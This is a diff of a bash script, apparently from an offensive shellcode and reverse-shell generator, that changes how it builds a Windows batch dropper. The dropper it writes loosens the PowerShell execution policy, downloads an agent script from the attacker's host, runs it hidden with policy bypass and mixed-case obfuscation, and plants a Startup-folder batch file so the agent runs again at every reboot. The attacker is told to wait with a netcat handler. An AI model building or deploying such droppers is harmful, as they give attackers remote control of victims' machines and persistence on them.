@@ -12362,33 +12362,22 @@ echo "---"
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will download/exec our '$NaM.ps1'\n(to the UPLOAD Location chosen by attacker) and writes 'Persiste.bat' into target\nStartup folder. ( Persiste.bat will execute our '$NaM.ps1' on every reboot )\n\nThe attacker just needs to start one netcat handler on sellected port." --radiolist --column "Pick" --column "Option" TRUE "No (default)" FALSE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts download from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen by attacker)\nand writes 'Persiste.bat' into target Startup folder. Persiste.bat will execute\nour '$NaM.ps1' on every reboot ).\n\nDo you wish to add persistence to dropper.bat ?" --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence" --width 370 --height 200) > /dev/null 2>&1
 
-if [ "$persistence" = "No (default)" ]; then
+if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
 else
-   PS_warning=$(zenity --list --title "☠ WARNING: POWERSHELL EXECUTION POLICY ☠" --text "For this method to work TARGET system needs to have is\nPowershell Execution Policy set to 'RemoteSigned' or else\nthe powershell agent will not auto-execute on startup\n\nDo you wish to continue or to use default payload?" --radiolist --column "Pick" --column "Option" TRUE "Use default payload (no persistence)" FALSE "Add persistence (continue)" --width 370 --height 200) > /dev/null 2>&1
-   if [ "$PS_warning" = "Add persistence (continue)" ]; then
-      echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
-      echo "@echo off" > $IPATH/output/$Drop.$ext.bat
-      echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
-      
-      ## Setting target PS to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup
-      # REMARK: UN-COMMENT (delete the # in front of command) in the next line (12381) to activate PS policy bypass ..
-      # echo "cmd.exe /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
-
-      echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
-      echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
-   else
-      echo "@echo off" > $IPATH/output/$Drop.$ext.bat
-      echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
-      echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
-      echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   fi
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
+   echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+   echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
+   ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
+   echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat\"" >> $IPATH/output/$Drop.$ext.bat
 fi
 
 
@@ -12476,7 +12465,7 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 
 ## Remark related to 'persistence' function..
 if [ "$persistence" = "Add persistence)" ]; then
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK:To delete 'persistence' we need to manualy delete the follow two scripts\n\n1 - $rpath\\$NaM.ps1 (agent.ps1)\n2 - %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: To delete 'persistence' from target machine we need to:\n\n1 - cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted\n2 - Del /F /Q $rpath\\$NaM.ps1 (agent.ps1)\n3 - Del /F /Q %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Persiste.bat (persistence script)" --info > /dev/null 2>&1
 fi
 sh_menu
 }
